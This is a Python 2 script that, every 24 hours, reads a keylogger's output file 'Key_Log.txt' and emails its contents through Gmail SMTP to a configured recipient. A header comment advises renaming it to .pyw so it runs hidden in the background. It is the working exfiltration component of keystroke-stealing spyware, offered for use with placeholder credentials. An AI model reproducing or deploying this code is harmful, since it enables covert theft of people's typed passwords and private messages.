# emailsending.py
'''
you can change extension from ** .py ** to ** .pyw ** , if you want to run the script in a background
'''
import time
from smtplib import SMTP, SMTPHeloError, SMTPAuthenticationError, SMTPException

# Constants for email sending 
TO = 'example@gmail.com' # This should change
SUBJECT = 'Keyboard Logs'
SLEEP_HOUR = 24 # Time interval between two messages
GMAIL_SENDER = 'eaxmple@gmail.com' # This should change
GMAIL_PASSWD = 'example_password' # This should change

# This two are configured for gmail
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587 

while True:
	txt = []
	with open('Key_Log.txt','r') as f:
		for line in f:
			txt.append(line) # Writing data to **txt** 

	# Setting up gmail server and configuring it
	server = SMTP(SMTP_SERVER, SMTP_PORT) 
	server.starttls()
	server.login(GMAIL_SENDER, GMAIL_PASSWD)

	txt_body = '\r\n'.join([
		'To:%s' % TO ,
		'From:%s' % GMAIL_SENDER,
		'Subject:%s' % SUBJECT,
		'',
		str(txt)])

	try:
		server.sendmail(GMAIL_SENDER, [TO], txt_body)
		# You might have some alerts here
		print 'Sucessfuly sent'

	except SMTPHeloError as err:
		print 'The server did not replied to HELO greeting %s' % err 
	except SMTPAuthenticationError as err:
		print 'The server did not accept username/password commbination %s' % err
	except SMTPException as err:
		print 'No suitable authentication method was found %s' % err
	except:
		print 'Unknown error was occured'
	finally:
		server.quit()
		time.sleep(SLEEP_HOUR * 3600) # Concerting hour to seconds